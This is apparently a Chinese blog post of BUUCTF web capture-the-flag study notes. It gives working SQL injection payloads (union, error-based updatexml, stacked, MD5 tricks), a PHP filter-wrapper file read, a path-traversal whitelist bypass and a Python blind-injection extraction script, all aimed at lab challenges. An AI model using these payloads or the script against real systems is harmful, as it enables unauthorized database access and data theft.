<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>【BUUCTF刷题】Web解题方法总结（一) - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="【BUUCTF刷题】Web解题方法总结（一)" />
<meta property="og:description" content="文章目录 前言信息搜集SQL缺省代码审计SQL注入常规流程BUUCTF HardSQL堆叠注入使用MD5函数实现sql注入例题BUUCTF WEB [CISCN2019 华北赛区 Day2 Web1]Hack World(SQL盲注，PHP）[GYCTF2020]Blacklist [堆叠注入] Ping命令nc tornado文件上传解法 [MRCTF]你传你🐎呢 HTTPPHP序列化和反序列化buu NiZhuanSiWeiBUUCTF [网鼎杯 2020 青龙组]AreUSerialz SSRF 前言 边刷题边总结些知识点，还在更新，冲！ 信息搜集 1.dirsearch使用
下载地址：https://github.com/maurosoria/dirsearch
切换到安装目录
py dirsearch.py -u 网址 -e 语言（一般用*） -u 指定url
-e 指定网站语言
SQL缺省 payload：*,1
查询语句：select *,1||flag from Flag
解题思路2：
payload:1;set sql_mode=PIPES_AS_CONCAT;select 1
解析：
在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接。
但在mysql 缺省不支持。需要调整mysql 的sql_mode
模式：pipes_as_concat 来实现oracle 的一些功能。
代码审计 1.使用php伪协议读文件内容。使用filter过滤器
?file=php://filter/convert.base64-encode/resource=flag.php 例题：BUUCTFweb Secret File
抓包
phpmyadmin 4.8.1的一个远程文件包含的漏洞(CVE) 白名单验证：" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/bf339627b513cce4c61b117ff2e09ca0/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-03-28T19:50:53+08:00" />
<meta property="article:modified_time" content="2021-03-28T19:50:53+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">【BUUCTF刷题】Web解题方法总结（一)</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-tomorrow-night-eighties">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><a href="#_1" rel="nofollow">前言</a></li><li><ul><li><a href="#_5" rel="nofollow">信息搜集</a></li><li><a href="#SQL_14" rel="nofollow">SQL缺省</a></li><li><a href="#_30" rel="nofollow">代码审计</a></li><li><a href="#SQL_112" rel="nofollow">SQL注入</a></li><li><ul><li><a href="#_113" rel="nofollow">常规流程</a></li><li><a href="#BUUCTF_HardSQL_154" rel="nofollow">BUUCTF HardSQL</a></li><li><a href="#_186" rel="nofollow">堆叠注入</a></li><li><a href="#MD5sql_218" rel="nofollow">使用MD5函数实现sql注入</a></li><li><a href="#_250" rel="nofollow">例题</a></li><li><ul><li><a href="#BUUCTF_WEB_CISCN2019__Day2_Web1Hack_WorldSQLPHP_251" rel="nofollow">BUUCTF WEB [CISCN2019 华北赛区 Day2 Web1]Hack World(SQL盲注，PHP）</a></li><li><a href="#GYCTF2020Blacklist__356" rel="nofollow">[GYCTF2020]Blacklist [堆叠注入]</a></li></ul> 
   </li></ul> 
   </li><li><a href="#Ping_376" rel="nofollow">Ping命令</a></li><li><ul><li><ul><li><a href="#nc_428" rel="nofollow">nc</a></li></ul> 
   </li></ul> 
   </li><li><a href="#tornado_432" rel="nofollow">tornado</a></li><li><a href="#_455" rel="nofollow">文件上传</a></li><li><ul><li><ul><li><a href="#_456" rel="nofollow">解法</a></li></ul> 
    </li><li><a href="#MRCTF_477" rel="nofollow">[MRCTF]你传你🐎呢</a></li></ul> 
   </li><li><a href="#HTTP_503" rel="nofollow">HTTP</a></li><li><a href="#PHP_508" rel="nofollow">PHP</a></li><li><ul><li><a href="#_509" rel="nofollow">序列化和反序列化</a></li><li><a href="#buu_NiZhuanSiWei_528" rel="nofollow">buu NiZhuanSiWei</a></li><li><a href="#BUUCTF__2020_AreUSerialz_586" rel="nofollow">BUUCTF [网鼎杯 2020 青龙组]AreUSerialz</a></li></ul> 
   </li><li><a href="#SSRF_710" rel="nofollow">SSRF</a></li></ul> 
 </li></ul> 
</div> 
<p></p> 
<h2><a id="_1"></a>前言</h2> 
<pre><code>边刷题边总结些知识点，还在更新，冲！
</code></pre> 
<h3><a id="_5"></a>信息搜集</h3> 
<p>1.dirsearch使用<br> 下载地址：https://github.com/maurosoria/dirsearch<br> 切换到安装目录</p> 
<pre><code class="prism language-javascript">py dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u 网址 <span class="token operator">-</span>e 语言（一般用<span class="token operator">*</span>）
</code></pre> 
<p>-u 指定url<br> -e 指定网站语言</p> 
<h3><a id="SQL_14"></a>SQL缺省</h3> 
<p>payload：*,1</p> 
<p>查询语句：select *,1||flag from Flag</p> 
<p>解题思路2：<br> payload:1;set sql_mode=PIPES_AS_CONCAT;select 1</p> 
<p>解析：</p> 
<p>在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接。<br> 但在mysql 缺省不支持。需要调整mysql 的sql_mode<br> 模式：pipes_as_concat 来实现oracle 的一些功能。</p> 
<h3><a id="_30"></a>代码审计</h3> 
<p>1.使用php伪协议读文件内容。使用filter过滤器</p> 
<pre><code class="prism language-java"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>filter<span class="token operator">/</span>convert<span class="token punctuation">.</span>base64<span class="token operator">-</span>encode<span class="token operator">/</span>resource<span class="token operator">=</span>flag<span class="token punctuation">.</span>php
</code></pre> 
<p>例题：BUUCTFweb Secret File<br> <img src="https://images2.imgbox.com/3a/f3/unW2wXdj_o.png" alt="在这里插入图片描述"><br> 抓包</p> 
<ol start="2"><li><a href="https://www.cnblogs.com/leixiao-/p/10265150.html" rel="nofollow">phpmyadmin 4.8.1的一个远程文件包含的漏洞(CVE) </a><br> 白名单验证：<br> 例题：BUUCTF web warmup<br> 示例代码如下：</li></ol> 
<pre><code class="prism language-java"><span class="token operator">&lt;</span><span class="token operator">?</span>php
    <span class="token function">highlight_file</span><span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">class</span> <span class="token class-name">emmm</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">public</span> <span class="token keyword">static</span> function <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>$page<span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            $whitelist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span>$page<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span>$page<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                echo <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span>$page<span class="token punctuation">,</span> $whitelist<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            $_page <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
                $page<span class="token punctuation">,</span>
                <span class="token number">0</span><span class="token punctuation">,</span>
                <span class="token function">mb_strpos</span><span class="token punctuation">(</span>$page <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span>$_page<span class="token punctuation">,</span> $whitelist<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            $_page <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span>$page<span class="token punctuation">)</span><span class="token punctuation">;</span>
            $_page <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
                $_page<span class="token punctuation">,</span>
                <span class="token number">0</span><span class="token punctuation">,</span>
                <span class="token function">mb_strpos</span><span class="token punctuation">(</span>$_page <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span>$_page<span class="token punctuation">,</span> $whitelist<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            echo <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span>$_REQUEST<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  ##不能为空
        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span>$_REQUEST<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  ##是字符串
        <span class="token operator">&amp;&amp;</span> emmm<span class="token operator">:</span><span class="token operator">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span>$_REQUEST<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  ##上面checkfile返回为<span class="token boolean">true</span>
    <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        include $_REQUEST<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        exit<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
        echo <span class="token string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>  
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>分析</p> 
<p>checkfile()函数<br> 定义了一个白名单：source.php和hint.php，判断 $page是否为空、是否为字符串。<br> 判断 $page是否在白名单里，若存在返回true；<br> 考虑到page有参数的情况， $_page是取出 $page问号前的东西，然后再判断 $_page是否在白名单里，若存在则返回true；两个函数一个mb_substr和mb_strpos，总的意思就是截取变量page中?前面的字符串，然后再进行白名单校验。<br> 之后是url二次编码问题，需要将?进行二次url编码<br> 所以构造payload：</p> 
<pre><code class="prism language-java">file<span class="token operator">=</span>hint<span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">253f</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span>/<span class="token punctuation">.</span><span class="token punctuation">.</span>/<span class="token punctuation">.</span><span class="token punctuation">.</span>/<span class="token punctuation">.</span><span class="token punctuation">.</span>/<span class="token punctuation">.</span><span class="token punctuation">.</span>/<span class="token punctuation">.</span><span class="token punctuation">.</span>/<span class="token punctuation">.</span><span class="token punctuation">.</span>/<span class="token punctuation">.</span><span class="token punctuation">.</span>/ffffllllaaaagggg
或者
file<span class="token operator">=</span>hint<span class="token punctuation">.</span>php<span class="token operator">?</span>file<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span>/<span class="token punctuation">.</span><span class="token punctuation">.</span>/<span class="token punctuation">.</span><span class="token punctuation">.</span>/<span class="token punctuation">.</span><span class="token punctuation">.</span>/<span class="token punctuation">.</span><span class="token punctuation">.</span>/ffffllllaaaagggg
</code></pre> 
<pre><code>因为服务器会自动解一次码，所以 $page的值为hint.php%3f../../../../../../../../ffffllllaaaagggg，又一次url解码后，$_page的值为hint.php?../../../../../../../../ffffllllaaaagggg,然后截取问号前面的hint.php判断在白名单里返回true。
</code></pre> 
<h3><a id="SQL_112"></a>SQL注入</h3> 
<h4><a id="_113"></a>常规流程</h4> 
<p>使用hackbar<br> 1.判断是字符型还是数字型</p> 
<pre><code class="prism language-javascript">'or <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> #
</code></pre> 
<p>如果是整形，他的报错信息应为<br> " ’ " 那我们需要闭合，由于这个题目没有过滤任何sql注入的关键字，我们直接用 %23（#）来进行闭合sql语句</p> 
<p>2.爆列数</p> 
<pre><code class="prism language-javascript"><span class="token operator">?</span>username<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">11</span>' order by <span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span>  一般为<span class="token number">3</span>时有回显，字段数为<span class="token number">3</span>
</code></pre> 
<p>3.爆库</p> 
<pre><code class="prism language-javascipt">?username=1&amp;password=11' union select 1,version(),database()%23
</code></pre> 
<p>4.爆表名</p> 
<pre><code class="prism language-javascript"><span class="token operator">?</span>username<span class="token operator">=</span><span class="token number">123</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">111</span>' union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>tables where table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> 
<p>5.爆表</p> 
<pre><code class="prism language-java"><span class="token operator">?</span>username<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>'union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> from l0ve1ysq1 #
或
<span class="token operator">?</span>username<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,2,group_concat(concat_ws('</span><span class="token operator">-</span>'<span class="token punctuation">,</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span> from l0ve1ysq1<span class="token operator">%</span><span class="token number">23</span>
</code></pre> 
<p>ps:功能函数<br> 1.concat_ws()函数<br> 功能：一次性指定分隔符<br> 语法：concat_ws(separator,str1,str2,…)<br> 说明：第一个参数指定分隔符 分隔符不能为空 如果为NULL 则返回值NULL<br> 2.concat()函数<br> 功能：将多个字符串拼接成一个字符串<br> 语法：concat(str1,str2,…)<br> 返回结果为连接参数产生的字符串 如果有任何一个参数为NULL 则返回值NULL<br> 3.group_concat( [DISTINCT] 要连接的字段 [Order BY 排序字段 ASC/DESC] [Separator ‘分隔符’] )<br> 即按需求打印内容</p> 
<h4><a id="BUUCTF_HardSQL_154"></a>BUUCTF HardSQL</h4> 
<p>一个字符一个字符试发现很多字符如and,union都被过滤<br> 因为空格被过滤，用()分割语句达到代替空格的效果。=被过滤，可以用like替代。尝试用<a href="https://blog.csdn.net/qq_37873738/article/details/88042610">updatexml报错注入</a></p> 
<pre><code class="prism language-javascript">check<span class="token punctuation">.</span>php<span class="token operator">?</span>username<span class="token operator">=</span><span class="token number">1</span>'<span class="token function">or</span><span class="token punctuation">(</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">2</span>
</code></pre> 
<ul><li>爆出库名<br> <img src="https://images2.imgbox.com/64/5d/ZSPKqgMl_o.png" alt="在这里插入图片描述"></li><li>爆表名</li></ul> 
<pre><code class="prism language-javascipt">check.php?username=1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))),0x7e),1))%23&amp;password=2
</code></pre> 
<p><img src="https://images2.imgbox.com/0a/ad/HrGhqhbh_o.png" alt="在这里插入图片描述"></p> 
<ul><li>爆列名</li></ul> 
<pre><code class="prism language-javascipt">check.php?username=1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1'))),0x7e),1))%23&amp;password=2
</code></pre> 
<p><img src="https://images2.imgbox.com/0a/60/Oi6TnF2g_o.png" alt="在这里插入图片描述"></p> 
<ul><li>因为updataxml限制语句为32位，而flag长度大于32位，所以用left和right函数拼接</li></ul> 
<pre><code class="prism language-java">前半部分 check<span class="token punctuation">.</span>php<span class="token operator">?</span>username<span class="token operator">=</span><span class="token number">1</span>'<span class="token function">or</span><span class="token punctuation">(</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">left</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span>H4rDsq1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">2</span>

后半部分 <span class="token operator">!</span><span class="token punctuation">[</span>check<span class="token punctuation">.</span>php<span class="token operator">?</span>username<span class="token operator">=</span><span class="token number">1</span>'<span class="token function">or</span><span class="token punctuation">(</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">right</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span>H4rDsq1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">(</span>https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>img<span class="token operator">-</span>blog<span class="token punctuation">.</span>csdnimg<span class="token punctuation">.</span>cn<span class="token operator">/</span><span class="token number">20210405154340430.</span>png<span class="token operator">?</span>x<span class="token operator">-</span>oss<span class="token operator">-</span>process<span class="token operator">=</span>image<span class="token operator">/</span>watermark<span class="token punctuation">,</span>type_ZmFuZ3poZW5naGVpdGk<span class="token punctuation">,</span>shadow_10<span class="token punctuation">,</span>text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1<span class="token punctuation">,</span>size_16<span class="token punctuation">,</span>color_FFFFFF<span class="token punctuation">,</span>t_70<span class="token punctuation">)</span>

</code></pre> 
<p><img src="https://images2.imgbox.com/59/ac/xKlfoQDC_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/a4/a8/jPKA0JS6_o.png" alt="在这里插入图片描述"></p> 
<p>参考文章：【extractvalue报错注入】https://blog.csdn.net/qin9800/article/details/113446035</p> 
<h4><a id="_186"></a>堆叠注入</h4> 
<p>在SQL中，分号（;）是用来表示一条sql语句的结束。<br> 而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p> 
<p>查看表的语句，在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符</p> 
<p>1’;desc <code>1919810931114514</code>;</p> 
<p>知识点1：堆叠注入<br> 在SQL中，分号是用来表示一条sql语句的结束。如果在 ; 结束一个sql语句后继续构造下一条语句，效果就是分别执行两条sql语句。由于两条语句堆叠在同一行，而不是原本应该各自占据一行，所以这种注入成为堆叠注入。</p> 
<p>知识点2<br> 当数字型字符作为字段、表、库名查询时，应该用反单引号括起来</p> 
<p>mysql预处理语句</p> 
<pre><code class="prism language-java">PREPARE sqla from <span class="token string">'[my sql sequece]'</span><span class="token punctuation">;</span>  	 预定义SQL语句
EXECUTE sqla<span class="token punctuation">;</span> 							 执行预定义SQL语句
<span class="token punctuation">(</span>DEALLOCATE <span class="token operator">||</span> DROP<span class="token punctuation">)</span> PREPARE sqla<span class="token punctuation">;</span>  	 删除预定义SQL语句
</code></pre> 
<p>通过变量进行传递<br> SET @tn = ‘flag’; 存储表名<br> SET @sql = concat('select * from ', @tn); 存储SQL语句<br> PREPARE sqla from @sql; 预定义SQL语句<br> EXECUTE sqla; 执行预定义SQL语句<br> (DEALLOCATE || DROP) PREPARE sqla; 删除预定义SQL语句</p> 
<p>PREPARE语句准备好一条SQL语句，并分配给这条SQL语句一个名字供之后调用。<br> 准备好的SQL语句通过EXECUTE命令执行，通过DEALLOCATE PREPARE命令释放掉。</p> 
<h4><a id="MD5sql_218"></a>使用MD5函数实现sql注入</h4> 
<p>BUUCTF easy MD5<br> 1.知识点：<br> （1）MD5函数在加密ffifdyop后返回原始字符串’or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c ，另外mysql中以数字开头的字符串会被当做整形处理例如‘6abc’=6。<br> （2）md5绕过：因为md5不能处理数组，会返回NULL，因为NULL=NULL，可以实现绕过，传入数组，使得 md5 处理两个参数都返回 0 即可： payload:?a[]=1&amp;b[]=2<br> 或者传入两个md5处理后以0e开头的字符串</p> 
<pre><code class="prism language-java">下列的字符串的MD5值都是<span class="token number">0</span>e开头的：
QNKCDZO
<span class="token number">240610708</span>
s878926199a
s155964671a
s214587387a
s214587387a
</code></pre> 
<p>2.解题<br> 随便输入后抓包发现Hint中有提示<br> <img src="https://images2.imgbox.com/85/cc/EDPMduip_o.png" alt="在这里插入图片描述"><br> 利用md5特性传入ffifdyop，使得select语句为：</p> 
<pre><code class="prism language-java">select <span class="token operator">*</span> from <span class="token string">'admin'</span> where password<span class="token operator">=</span><span class="token string">' '</span>or <span class="token string">'6'</span>
</code></pre> 
<p>这样就相当于sql语句为永真实现注入<br> 得到<br> <img src="https://images2.imgbox.com/a5/4a/psH9nCJ0_o.png" alt="在这里插入图片描述"><br> 访问页面发现了php页面<br> <img src="https://images2.imgbox.com/94/ff/v2aWJVBI_o.png" alt="在这里插入图片描述"><br> 利用md5绕过得到<br> <img src="https://images2.imgbox.com/46/d3/Tyqdyxs4_o.png" alt="在这里插入图片描述"><br> 访问页面同样为一个md5绕过的php页面，易得flag</p> 
<h4><a id="_250"></a>例题</h4> 
<h5><a id="BUUCTF_WEB_CISCN2019__Day2_Web1Hack_WorldSQLPHP_251"></a>BUUCTF WEB [CISCN2019 华北赛区 Day2 Web1]Hack World(SQL盲注，PHP）</h5> 
<ul><li>题目描述:<br> <img src="https://images2.imgbox.com/23/e9/pxlp4WF0_o.png" alt="在这里插入图片描述"></li><li>已知表名和列名，并且发现过滤了很多sql字符，尝试注入</li></ul> 
<pre><code class="prism language-javascript"><span class="token number">1</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token function">ascii</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">1</span>
</code></pre> 
<p>奉上大佬脚本</p> 
<pre><code class="prism language-javascript"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

url <span class="token operator">=</span> <span class="token string">"http://f0c8caf0-fc27-454e-83bc-a557d1891b94.node3.buuoj.cn/index.php"</span>
temp <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">"id"</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">}</span>
flag <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    time<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0.06</span><span class="token punctuation">)</span>
    low <span class="token operator">=</span> <span class="token number">32</span>
    high <span class="token operator">=</span><span class="token number">128</span>
    mid <span class="token operator">=</span> <span class="token punctuation">(</span>low<span class="token operator">+</span>high<span class="token punctuation">)</span><span class="token comment">//2</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>low<span class="token operator">&lt;</span>high<span class="token punctuation">)</span><span class="token punctuation">:</span>
        temp<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"1^"</span> <span class="token operator">+</span> <span class="token string">"(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d)^1"</span> <span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>temp<span class="token punctuation">)</span>
        <span class="token function">print</span><span class="token punctuation">(</span>low<span class="token punctuation">,</span>high<span class="token punctuation">,</span>mid<span class="token punctuation">,</span><span class="token string">":"</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"Hello"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            low <span class="token operator">=</span> mid<span class="token operator">+</span><span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            high <span class="token operator">=</span> mid
        mid <span class="token operator">=</span><span class="token punctuation">(</span>low<span class="token operator">+</span>high<span class="token punctuation">)</span><span class="token comment">//2</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>mid <span class="token operator">==</span><span class="token number">32</span> or mid <span class="token operator">==</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    flag <span class="token operator">+=</span><span class="token function">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
    <span class="token function">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>


